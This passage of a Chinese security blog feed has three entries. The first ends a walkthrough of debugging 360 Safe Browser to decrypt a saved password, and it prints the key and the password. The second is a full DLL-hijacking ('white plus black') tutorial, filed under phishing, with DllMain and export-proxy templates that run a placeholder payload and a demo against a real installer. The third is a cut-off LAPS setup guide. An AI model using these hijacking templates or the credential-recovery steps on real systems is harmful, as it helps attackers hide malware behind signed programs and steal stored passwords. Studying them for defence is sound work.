src="/img/360SafeBrowser/fb64a57b-2a95-4afa-8d52-ba1e0c3166fc.png" alt="img"></p><p><img src="/img/360SafeBrowser/0189aff0-2c48-4c04-ad88-89cb09375184.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691F4E7E断点处。一直F8步入调试</p><p><img src="/img/360SafeBrowser/01fa40c0-0c0b-49ff-a0ca-b42330e5ac93.png" alt="img"></p><p>再一次找到了密文解密的点</p><p><img src="/img/360SafeBrowser/e04828cb-e63d-46b4-929f-539b7aeea317.png" alt="img"></p><p><img src="/img/360SafeBrowser/12cd9644-ae02-413a-9818-dc2df507d52a.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691F5328断点处。一直F8步入调试</p><p><img src="/img/360SafeBrowser/b6545905-8973-4e89-ace3-b78df91bc6a1.png" alt="img"></p><pre><code>1560A2E8  01 13 73 0D 78 62 71 32 33 4D 7A 15 78 61 41 5F  ..s.xbq23Mz.xaA_  1560A2F8  52 5F 4D 39 77 06 71 47 38 21 48 1A 4D 0D 78 19  R_M9w.qG8!H.M.x.  1560A308  4E 5E 4F 52 67 0C 53 30 7A 00 00 00 00 00 00 00  N^ORg.S0z.......  </code></pre><p><img src="/img/360SafeBrowser/3fb10444-94b5-439b-8505-add24917c8f8.png" alt="img"></p><p>那么这就有一个问题了，进入到691F5328断点前，其实已经解密了，691F5328只是处理解密后的字符串得到密码。</p><p>回到691F5328断点前寻找解密函数。</p><p><img src="/img/360SafeBrowser/2ec8837d-c531-42ee-bb96-1065e2be8f47.png" alt="img"></p><p><img src="/img/360SafeBrowser/92383bbb-0ae3-4997-8712-b8241f844ba2.png" alt="img"></p><p><img src="/img/360SafeBrowser/99968427-6908-45b0-8cfe-40e74c97a3a4.png" alt="img"></p><p><img src="/img/360SafeBrowser/88c55d5f-96e6-4ba8-beb9-1074ded4ef7a.png" alt="img"></p><p><img src="/img/360SafeBrowser/7699ac5d-dc36-4ff3-b614-97b43079e31b.png" alt="img"><img src="/img/360SafeBrowser/c8a1f11e-fed0-4dac-8f89-7023423e2ef8.png" alt="img"></p><p>这时候突然想到，既然691F50A0是解密的函数，那么密钥可能是从外部传参进来的，那么就不应该再691F50A0里找密钥，而是在691F50A0上面找</p><p><img src="/img/360SafeBrowser/660487aa-9ac7-4627-a060-e21cbb7fa3a7.png" alt="img"></p><pre><code>0E25F104  63 66 36 36 66 62 35 38 66 35 63 61 33 34 38 35  cf66fb58f5ca3485  </code></pre><p><img src="/img/360SafeBrowser/0602fd2f-9ad9-4989-a35d-fac7fd55cd96.png" alt="img"></p><p>判断奇偶得到密码</p><pre><code>sxq3zxARMwq8HMxNOgSz</code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态调试360安全浏览器获取密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之dll劫持（白加黑）</title>
      <link href="/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/"/>
      <url>/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之dll劫持（白加黑）"><a href="#钓鱼与社工系列之dll劫持（白加黑）" class="headerlink" title="钓鱼与社工系列之dll劫持（白加黑）"></a>钓鱼与社工系列之dll劫持（白加黑）</h1><h2 id="0x00-知识扫盲"><a href="#0x00-知识扫盲" class="headerlink" title="0x00 知识扫盲"></a>0x00 知识扫盲</h2><h3 id="0x00-1-什么是dll？"><a href="#0x00-1-什么是dll？" class="headerlink" title="0x00-1 什么是dll？"></a>0x00-1 什么是dll？</h3><p>​    DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。</p><h3 id="0x00-2-DLL劫持漏洞（DLL-Hijacking-Exploit"><a href="#0x00-2-DLL劫持漏洞（DLL-Hijacking-Exploit" class="headerlink" title="0x00-2 DLL劫持漏洞（DLL Hijacking Exploit"></a>0x00-2 DLL劫持漏洞（DLL Hijacking Exploit</h3><p>​    严格点说，它是通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL的一类漏洞的统称。</p><p>​    DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary来看。熟悉Windows代码的同学都知道，调用LoadLibrary时可以使用DLL的相对路径。这时，系统会按照特定的顺序搜索一些目录，以确定DLL的完整路径。根据MSDN文档的约定，在使用相对路径调用LoadLibrary（同样适用于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的DLL文件（会根据SafeDllSearchMode配置而稍有不同）。</p><p>（参考链接：<a href="https://security.tencent.com/index.php/blog/msg/20）" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/20）</a></p><pre><code>程序所在目录。加载 DLL 时所在的当前目录。系统目录即 SYSTEM32 目录。16位系统目录即 SYSTEM 目录。Windows目录。PATH环境变量中列出的目录</code></pre><h3 id="0x00-3-白加黑"><a href="#0x00-3-白加黑" class="headerlink" title="0x00-3 白加黑"></a>0x00-3 白加黑</h3><p>​    所谓的”白加黑”，笼统来说是”白exe”加”黑dll”，”白exe”是指带有数字签名的正常exe文件，那么”黑dll”当然是指包含恶意代码 的dll文件。病毒借助那些带数字签名且在杀毒软件白名单内的exe程序去加载自己带有恶意代码的dll，便能获得杀毒软件主动防御的自动信任，从而成功 加载到系统中。</p><h2 id="0x01-编译介绍"><a href="#0x01-编译介绍" class="headerlink" title="0x01 编译介绍"></a>0x01 编译介绍</h2><p>Release的exe文件链接的是标准的MFC DLL(Use MFC in a shared or static dll)。这些DLL在安装Windows的时候已经配置，所以这些程序能够在没有安装Visual C++的机器上运行。而Debug版本的exe链接了调试版本的MFC DLL文件，在没有安装Visual C++的机器上不能运行，因为缺相应的DLL，除非选择use static dll when link。</p><p>静态编译：debug状态下：MTd release状态下：MT</p><p>动态编译：debug状态下：MDd release状态下：MD</p><p>动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p><p>所以综上所述，我们选择静态编译，Release！</p><h2 id="0x02-编写一个dll文件"><a href="#0x02-编写一个dll文件" class="headerlink" title="0x02 编写一个dll文件"></a>0x02 编写一个dll文件</h2><p>创建dll项目</p><p><img src="/img/dllHijacking/ddb4c80b-a50f-41f9-8faf-5cbd7a2a93d8.png" alt="img"></p><p><img src="/img/dllHijacking/d0608f5a-729c-4851-8fb9-d12140bb4333.png" alt="img"></p><p><img src="/img/dllHijacking/3bed69d3-d7e2-49df-9a78-f5adac8a7752.png" alt="img"></p><p><img src="/img/dllHijacking/65e5cc4a-397a-453d-b902-9e61ce100734.png" alt="img"></p><p><img src="/img/dllHijacking/d57ad161-432b-44a0-b75e-57033b5ee38d.png" alt="img"></p><p><img src="/img/dllHijacking/fb4c4aff-59f0-4e89-98fa-9c2ae404e8ed.png" alt="img"></p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    MessageBox(NULL,L&quot;_Title_&quot;,L&quot;Hello&quot;,MB_OK);    return;}</code></pre><p><img src="/img/dllHijacking/ad374a13-c7aa-4dc0-9600-0c1ca4c1b97d.png" alt="img"></p><p><img src="/img/dllHijacking/4146bea6-9175-4598-845d-42778d7c7650.png" alt="img"></p><p><img src="/img/dllHijacking/a1879903-5f2e-426c-9169-5ecb77adb0f3.png" alt="img"></p><h2 id="0x03-两种劫持方法"><a href="#0x03-两种劫持方法" class="headerlink" title="0x03 两种劫持方法"></a>0x03 两种劫持方法</h2><h3 id="0x03-1-第一种dll劫持场景：劫持程序运行时加载的未知dll文件"><a href="#0x03-1-第一种dll劫持场景：劫持程序运行时加载的未知dll文件" class="headerlink" title="0x03-1 第一种dll劫持场景：劫持程序运行时加载的未知dll文件"></a>0x03-1 第一种dll劫持场景：劫持程序运行时加载的未知dll文件</h3><p><strong>某个exe程序运行的时候，使用ProcessMonitor监听</strong></p><p><strong>1. result为NAME NOT FOUND，即找不到dll文件（dll文件名为A.dll）。</strong></p><p><strong>2. 该dll文件调用了LoadLibrary函数</strong></p><p><strong>3. 自己编写dll，重命名A.dll。</strong></p><p><strong>4. 重复之前的程序运行过程，就可以劫持</strong></p><p>DllMain里的代码是程序加载dll文件时，可以选择</p><p>1.进程装载DLL。</p><p>2.进程卸载DLL。</p><p>3.DLL在被装载之后创建了新线程。</p><p>4.DLL在被装载之后一个线程被终止了</p><p>这四种情况下执行恶意代码，</p><p>测试dll文件是否可用性，可以执行rundll32 DllMain.dll aaaaaa(随便加函数名) 调用</p><p><strong>一般选择DLL_PROCESS_ATTACH，则进程加载DLL时就会执行恶意代码</strong></p><p><strong>劫持dll的代码模板</strong></p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p><img src="/img/dllHijacking/3311b3ad-835d-4eec-825f-65308f0641b8.png" alt="img"></p><p><img src="/img/dllHijacking/97186110-36b5-4b35-8423-0c8cb9dcd733.jpg" alt="img"></p><h3 id="0x03-2-第二种dll劫持场景：劫持-某个功能（例如截图）所调用的dll文件"><a href="#0x03-2-第二种dll劫持场景：劫持-某个功能（例如截图）所调用的dll文件" class="headerlink" title="0x03-2 第二种dll劫持场景：劫持**某个功能（例如截图）所调用的dll文件"></a>0x03-2 第二种dll劫持场景：劫持**某个功能（例如截图）所调用的dll文件</h3><p><strong>某个exe程序运行的时候，监控某个功能（例如截图）所调用的dll文件</strong></p><p><strong>1. 使用CFFExplorer工具查看该dll文件(dll文件名为B)，导入目录里的kerbel32.dll里是否调用了LoadLibrary。</strong></p><p><strong>2. 如果调用了LoadLibrary，则在导出目录找导出的函数名（函数名为C）</strong></p><p><strong>3. 自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll</strong></p><p><strong>4. 运行该程序的某个功能，即可劫持</strong></p><p>代码demo</p><p>extern导出函数的代码可以用rundll32 dllExtern.dll test(函数名) 调用</p><p>extern “C” extern “C”使得在C++中使用C编译方式成为可能。在“C++”下定义“C”函数，需要加extern “C”关键词。用extern “C”来指明该函数使用C编译方式。输出的“C”函数可以从“C”代码里调用</p><p>__declspec(dllexport)的作用就是让编译器按照某种预定的方式（前面大致解释了这种方式的规则）来输出导出函数及变量的符号</p><p><img src="/img/dllHijacking/7acdb63b-b8dc-43c6-a762-efd640138ca5.jpg" alt="img"></p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    WinExec(&quot;calc.exe&quot;, SW_HIDE);    return;}</code></pre><p><img src="/img/dllHijacking/77ce6d79-41a6-4e60-b75e-8c3eb77cd7c6.png" alt="img"></p><p><img src="/img/dllHijacking/fec18db9-81d3-4f05-af6b-5097d3c34bd2.jpg" alt="img"></p><p><strong>劫持dll的代码模板</strong></p><p><strong>假设程序加载的dll名字为B，B.dll的导出函数为C</strong></p><p><strong>劫持的dll名字改为B</strong></p><p><strong>B.dll改为B_Origin.dll</strong></p><p><strong>PrScrn改为C</strong></p><p><strong>PrScrn_Origial.dll改为B_Origin.dll</strong></p><pre><code>#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void PrScrn();BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void PrScrn(){    MessageBox(NULL, L&quot;DLL Hijack! by DLLHijacker!&quot;, L&quot;:)&quot;, 0);  //我们要攻击的恶意代码    HINSTANCE hDllInst = LoadLibrary(L&quot;PrScrn_Origial.dll&quot;);    if (hDllInst)    {        typedef DWORD(WINAPI *EXPFUNC)();        EXPFUNC exportFunc = NULL;        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, &quot;PrScrn&quot;);        if (exportFunc)        {            exportFunc();        }        FreeLibrary(hDllInst);    }    return;}</code></pre><h2 id="0x04-本地dll劫持场景模拟"><a href="#0x04-本地dll劫持场景模拟" class="headerlink" title="0x04 本地dll劫持场景模拟"></a>0x04 本地dll劫持场景模拟</h2><p>模拟一个exe程序调用dll文件，然后用自己的dll去劫持</p><h3 id="0x04-1-创建dll项目，项目名为aaa"><a href="#0x04-1-创建dll项目，项目名为aaa" class="headerlink" title="0x04-1 创建dll项目，项目名为aaa"></a>0x04-1 创建dll项目，项目名为aaa</h3><p>源.cpp</p><pre><code>#include &lt;Windows.h&gt;// 这是导出变量的一个示例extern &quot;C&quot; _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow){    MessageBox(NULL, TEXT(&quot;我是程序运行时正常加载的dll&quot;), TEXT(&quot;hello&quot;), NULL);    return;}</code></pre><p><img src="/img/dllHijacking/56f864e9-d608-4075-a419-b6c909d3dd47.png" alt="img"></p><h3 id="0x04-2-创建一个MFC程序，模拟一个正常的exe去加载dll"><a href="#0x04-2-创建一个MFC程序，模拟一个正常的exe去加载dll" class="headerlink" title="0x04-2 创建一个MFC程序，模拟一个正常的exe去加载dll"></a>0x04-2 创建一个MFC程序，模拟一个正常的exe去加载dll</h3><p><img src="/img/dllHijacking/d6443f71-fc0f-4c41-ae5f-91a92c2c9f6b.png" alt="img"></p><p><img src="/img/dllHijacking/5b9f98d9-2a0b-4437-8dc0-9fed139d3f14.png" alt="img"></p><p>一直下一步直到完成</p><p>从工具箱里托一个按钮</p><p><img src="/img/dllHijacking/5fbb8def-76cc-4e50-aca1-86b5de88c75c.png" alt="img"></p><p>双击按钮，在OnBnClickedButton1函数里添加代码</p><pre><code>void CMFC_aaaDlg::OnBnClickedButton1(){    // TODO: 在此添加控件通知处理程序代码    typedef DWORD (*TEST)();    HINSTANCE hLibrary;    hLibrary = LoadLibrary(TEXT(&quot;aaa.dll&quot;));                // 使用LoadLibrary加载dll    TEST test = (TEST)GetProcAddress(hLibrary, &quot;test&quot;);     // 获取dll文件的函数地址    test();                                                 // 运行函数}</code></pre><p><img src="/img/dllHijacking/7f416a23-0aee-40b4-810f-7df7d1212b25.png" alt="img"></p><p>编译即可。将aaa.dll文件拖到MFC_aaa.exe当前目录下</p><p><img src="/img/dllHijacking/d913a0e7-6a7d-4d77-9762-20d809862adc.png" alt="img"></p><p>运行MFC_aaa.exe，点击Button1，成功加载aaa.dll文件</p><p><img src="/img/dllHijacking/4ba9f664-1864-4ae9-869a-2455c4be222a.png" alt="img"></p><h3 id="0x04-3-模拟劫持未知的dll文件"><a href="#0x04-3-模拟劫持未知的dll文件" class="headerlink" title="0x04-3 模拟劫持未知的dll文件"></a>0x04-3 模拟劫持未知的dll文件</h3><p>当MFC_aaa.exe程序运行的时候，会加载aaa.dll文件。那么当我们用ProcessMonitor去检测，发现aaa.dll文件不存在，并且还调用了LoadLibrary。那么此时就可以劫持。</p><p>环境开始模拟：MFC_aaa.exe当前目录下没有任何dll文件</p><p><img src="/img/dllHijacking/17ddcc92-aea7-45a6-8dae-058134f596e9.png" alt="img"></p><p>使用ProcessMonitor监听</p><p><img src="/img/dllHijacking/3b87a787-0f53-4b06-b552-3dc9f5bc188e.png" alt="img"></p><p><img src="/img/dllHijacking/378b82cb-0553-4596-b266-1b9ce74de8df.png" alt="img"></p><p>运行MFC_aaa.exe，点击button1发现程序加载aaa.dll文件，从当前目录开始查找，但是结果都是没有找到。</p><p>引出一个知识，dll查找路径</p><pre><code>1.程序所在目录。2.加载 DLL 时所在的当前目录。3.系统目录即 SYSTEM32 目录。4.16位系统目录即 SYSTEM 目录。5.Windows目录。6.PATH环境变量中列出的目录</code></pre><p><img src="/img/dllHijacking/84280466-5824-4105-9b90-cf9688e98617.png" alt="img"></p><p>查看aaa.dll的Stack，发现程序是通过LoadLibrary加载的aaa.dll，那么这种情况下就可以做劫持了。</p><p><img src="/img/dllHijacking/00eed3a3-df61-4372-9d5f-7b27928e85c7.png" alt="img"></p><p>开始编写劫持代码，使用DllMain进行劫持，如果劫持成功，就会弹出计算机。</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p><img src="/img/dllHijacking/be3d945e-fe59-4f88-87a0-fc7a57fc35af.png" alt="img"></p><p>将编译好的dllInject1.dll重命名为aaa.dll，并放到MFC_aaa.exe同目录下，运行MFC_aaa.exe。</p><p>成功劫持了MFC_aaa.exe运行时加载的dll文件</p><p><img src="/img/dllHijacking/6c2e9028-d472-4bd9-bee5-03f7c5d6ea5c.jpg" alt="img"></p><h3 id="0x04-4-模拟劫持存在的dll文件"><a href="#0x04-4-模拟劫持存在的dll文件" class="headerlink" title="0x04-4 模拟劫持存在的dll文件"></a>0x04-4 模拟劫持存在的dll文件</h3><p>MFC_aaa.exe当前程序目录下面存在aaa.dll文件</p><p><img src="/img/dllHijacking/e2e2fc58-044c-49ba-abf7-8a9520f181e5.png" alt="img"></p><p><img src="/img/dllHijacking/10c2602a-23ae-4006-970c-be2a606c26c5.png" alt="img"></p><p>运行MFC_aaa.exe</p><p><img src="/img/dllHijacking/d5e92963-7ab4-4d3c-8e96-677e14d476fc.png" alt="img"></p><p><img src="/img/dllHijacking/6f918fae-61b2-4349-b7f1-d70ea90ebea3.png" alt="img"></p><p>使用CFFExplorer查看aaa.dll文件</p><p><img src="/img/dllHijacking/f748769f-1a4a-49d8-aa87-2dcdc14a3291.png" alt="img"></p><p><img src="/img/dllHijacking/43cdb258-b27c-4ae2-8838-4a8fbebbfdb2.png" alt="img"></p><p>开始编写劫持代码，使用extern进行劫持，如果劫持成功，就会弹出计算机，并且弹框“DLL Hijack! by DLLHijacker!”</p><pre><code>#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void test(){    MessageBox(NULL, L&quot;DLL Hijack! by DLLHijacker!&quot;, L&quot;:)&quot;, 0);  //我们要攻击的恶意代码    HINSTANCE hDllInst = LoadLibrary(L&quot;aaa_Origial.dll&quot;);    if (hDllInst)    {        typedef DWORD(WINAPI *EXPFUNC)();        EXPFUNC exportFunc = NULL;        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);        if (exportFunc)        {            exportFunc();        }        FreeLibrary(hDllInst);    }    return;}</code></pre><p><img src="/img/dllHijacking/197af274-1b75-4985-8037-6d55819c6834.png" alt="img"></p><p>将编译好的文件放到MFC_aaa.exe同目录下，并且重命名为aaa.dll。原先的aaa.dll重命名为aaa_Origial.dll。</p><p><img src="/img/dllHijacking/c82b5d9a-3dc6-4517-9ad3-741a77185520.png" alt="img"></p><p>运行后成功劫持，弹出计算机和弹框</p><p><img src="/img/dllHijacking/a83deb90-9fbf-4889-a0d1-34cb10037a6e.jpg" alt="img"></p><h2 id="0x05-实战dll劫持"><a href="#0x05-实战dll劫持" class="headerlink" title="0x05 实战dll劫持"></a>0x05 实战dll劫持</h2><p>案例一：音速启动安装时的dll劫持</p><p>监控音速启动调用的dll</p><p><img src="/img/dllHijacking/3361168b-c355-4189-9e1b-5fdea0a18a86.png" alt="img"></p><p>其中一个不存在的dll调用了LoadLibrary</p><p><img src="/img/dllHijacking/24b54885-336d-493c-aca0-6d747ea1c067.png" alt="img"></p><p>编写劫持dll</p><pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &lt;Windows.h&gt;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        WinExec(&quot;calc.exe&quot;, SW_HIDE);            //我们要攻击的恶意代码    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p>将dll重命名为Riched20.dll，并放到音速启动程序的同目录下</p><p><img src="/img/dllHijacking/432fff3f-ca3b-4167-b61d-295c7cf8c862.png" alt="img"></p><p>重新运行程序，成功弹出计算机</p><p><img src="/img/dllHijacking/13a96af4-3863-4f38-8a75-41c0bc38bae7.jpg" alt="img"></p><pre><code>存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之dll劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组策略之LAPS</title>
      <link href="/2020/11/26/zu-ce-lue-zhi-laps/"/>
      <url>/2020/11/26/zu-ce-lue-zhi-laps/</url>
      
        <content type="html"><![CDATA[<h1 id="组策略之Local-Administrator-Password-Solution"><a href="#组策略之Local-Administrator-Password-Solution" class="headerlink" title="组策略之Local Administrator Password Solution"></a>组策略之Local Administrator Password Solution</h1><h2 id="0x00-LAPS介绍"><a href="#0x00-LAPS介绍" class="headerlink" title="0x00 LAPS介绍"></a>0x00 LAPS介绍</h2><p>介绍：</p><pre><code>将本地管理员密码存储在LDAP上，作为计算机账户的一个机密属性，配合GPO，实现自动定期修改密码、设置密码长度、强度等，然后配置某些指的账号，能查看存储的密码，如果用户需要，可以用PowerShell或指的工具查询密码，但对非授权用户，确无法获取，从而实现本机管理员的自动化管理。LAPS使用两个LDAP属性来存储本地管理员凭证，这两个属性分别是ms-MCS-AdmPwd（存储密码）和ms-MCS-AdmPwdExpirationTime（存储过期时间）。</code></pre><p>功能：</p><pre><code>如果配置不当，我们可以在域内一台普通主机，查看域内其他主机本地管理员账号LAPS解决方案的核心是GPO客户端扩展（CSE），它执行以下任务，并可以在GPO更新期间执行以下操作：检查本地Administrator帐户的密码是否已过期。当旧密码过期或需要在过期之前进行更改时，生成新密码。根据密码策略验证新密码。将密码报告给Active Directory，并将密码和机密属性一起存储在Active Directory中。将密码的下一个到期时间报告给Active Directory，并将该属性与计算机帐户的属性一起存储在Active Directory中。更改管理员帐户的密码。然后，允许这样做的用户可以从Active Directory中读取密码。合格的用户可以请求更改计算机的密码。计算机帐户只能写入/更新自己的本地管理员帐户密码（ms-Mcs-AdmPwd属性），而不能从该属性读取密码。可以轻松地为OU中的每台计算机更改密码。</code></pre><p>展示：</p><pre><code>laps再ldap的属性里：      ms-MCS-AdmPwd：存储密码      ms-MCS-AdmPwdExpirationTime：存储过期时间</code></pre><p>靶场环境介绍：</p><pre><code>测试环境:组织 OU：lapsComputers            MOTOO-IISWEB$           域机器组织 OU：lapsAdminUsers            lidan                   域用户组 group： lapsAdmins            lidan                   用户</code></pre><h2 id="0x01-域控创建组织lapsComputers和laspAdminUsers"><a href="#0x01-域控创建组织lapsComputers和laspAdminUsers" class="headerlink" title="0x01 域控创建组织lapsComputers和laspAdminUsers"></a>0x01 域控创建组织lapsComputers和laspAdminUsers</h2><p>创建组织OU</p><p><img src="/img/laps/06be0350-b9fc-4f70-8251-4b1943e29e92.png" alt="img"></p><p><img src="/img/laps/267ccd8a-efc5-482b-887f-206860d1d593.png" alt="img"></p><p><img src="/img/laps/afdccd17-1fb6-494a-abd1-c099e12466c5.png" alt="img"></p><p>成功将Motoo-IISWEB域机器加入到lapsComputers组织里</p><p><img src="/img/laps/a3cfe6ee-031e-43c0-9033-57aadea88a6d.png" alt="img"></p><p><img src="/img/laps/36550d89-2bfc-4a81-bd53-68e589320c10.png" alt="img"></p><p>同样创建组织OU：lapsAdminUsers</p><p>创建组：lapsAdmins</p><p>将liidan域用户加入到组织OU：lapsAdminUsers里，并且加入到组lapsAdmins</p><p><img src="/img/laps/88c58275-6c1e-44bd-8bc5-a9a205ea98c5.png" alt="img"></p><p>通过net user lidan /do可以看到在lapsAdmins组里</p><p><img src="/img/laps/40976aa6-3d48-43e1-b794-b3064c64010d.png" alt="img"></p><h2 id="0x02-安装LAPS"><a href="#0x02-安装LAPS" class="headerlink" title="0x02 安装LAPS"></a>0x02 安装LAPS</h2><p>域控安装laps</p><p><img src="/img/laps/c464ad27-67dc-42ec-9cd1-a77dcf5e68c9.png" alt="img"></p><p><img src="/img/laps/ffc755e3-cdc8-437f-814b-9d516ee3c6a1.png" alt="img"></p><p>扩展AD的架构</p><p>windows2008 的powershell版本是2.0，需要更新到3.0。才能导入Admpwd.ps</p><pre><code>Import-module AdmPwd.PSUpdate-AdmPwdADSchema</code></pre><p>使用Update-AdmPwdADSchema扩展架构</p><p><img src="/img/laps/cb3524f3-5066-4ac4-9368-28a2ee89be40.png" alt="img"></p><p>从活动目录中可以看到多出了这两个属性</p><p><img src="/img/laps/15054f83-f716-448a-96e0-3b9fa4a63729.png" alt="img"></p><p>查询lapsComputers这个OU的访问权限，可以看到目前只有域机器system权限和域管可以访问</p><pre><code>Find-AdmPwdExtendedRights -Identity lapsComputers | Format-Table -AutoSizeFind-AdmPwdExtendedRights -Identity &quot;OU=lapsComputers,DC=Motoo,DC=nc&quot; | Format-Table -AutoSize</code></pre><p><img src="/img/laps/2e624156-bdc6-494d-a2ea-73c1d5c367b7.png" alt="img"></p><p><img src="/img/laps/8e47f1c5-6c1f-44d1-bae3-21d9d27a2931.png" alt="img"></p><p>使用以下命令授予计算机修改本机ms-Mcs-AdmPwdExpirationTime 和 ms-Mcs-AdmPwd这两个扩展属性的权限。</p><pre><code>Set-AdmPwdComputerSelfPermission -OrgUnit lapsComputers</code></pre><p><img src="/img/laps/208df236-fd47-4f17-9fbf-fd8749c6dbcc.png" alt="img"></p><p>使用以下命令设置读取组织lapsComputers里的计算机扩展属性的权限组为lapsAdmins</p><pre><code>Set-AdmPwdReadPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/87ccb97d-2d29-4329-ab22-c38707dac924.png" alt="img"></p><p>可以看到成功多了Motoo\lapsAdmins组</p><p><img src="/img/laps/46bd3eb0-d9d7-47fd-9d1e-82d8765870cd.png" alt="img"></p><p>使用以下命令设置重置密码的权限组为LAPAdmins</p><pre><code>Set-AdmPwdResetPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/e71de080-08fa-48ff-b202-074440f24b9e.png" alt="img"></p><p><img src="/img/laps/d6fdfc9f-f28d-4a72-bb1b-119cfa21a7e6.png" alt="img"></p><h2 id="0x03-创建两条组策略链接到创建的OU上"><a href="#0x03-创建两条组策略链接到创建的OU上" class="headerlink" title="0x03 创建两条组策略链接到创建的OU上"></a>0x03 创建两条组策略链接到创建的OU上</h2><pre><code>lapsAdminUsers组织创建组策略install laps           目的：当lapsAdminUsers组织里的域用户登录时，通过组策略安装lapslapsComputers组织创建组策略set laps                目的：当域用户登陆后成功安装了laps后，通过组策略自动修改本地管理员密码</code></pre><p>打开域组策略gpmc.msc，启动组策略管理控制台，右键单击该域，然后单击“ 在此域中创建 GPO并在此处链接”。为GPO提供一个名称。</p><h3 id="0x03-1-lapsAdminUsers组织创建组策略install-laps"><a href="#0x03-1-lapsAdminUsers组织创建组策略install-laps" class="headerlink" title="0x03-1 lapsAdminUsers组织创建组策略install laps"></a>0x03-1 lapsAdminUsers组织创建组策略install laps</h3><p>在lapsAdminUsers的组织里新建一个组策略</p><p><img src="/img/laps/7f93f76b-9304-48e0-af0e-6490f265f358.png" alt="img"></p><p><img src="/img/laps/bd6a7356-251a-494e-a910-719c60f898fc.png" alt="img"></p><p>同时在\Motoo.nc\SYSVOL\Motoo.nc\Policies路径下多了该文件夹</p><p><img src="/img/laps/b1a91f02-8043-4602-bd57-1b8e369c4053.png" alt="img"></p><p>将laps安装包放到该文件夹下的Machine</p><p><img src="/img/laps/7d3aa3fc-2305-4ccc-a1d6-54d030a19ade.png" alt="img"></p><p>编辑组策略install laps</p><p><img src="/img/laps/1434a2e8-7f85-4edb-80ee-3257a03aad67.png" alt="img"></p><p>选择安装包</p><p><img 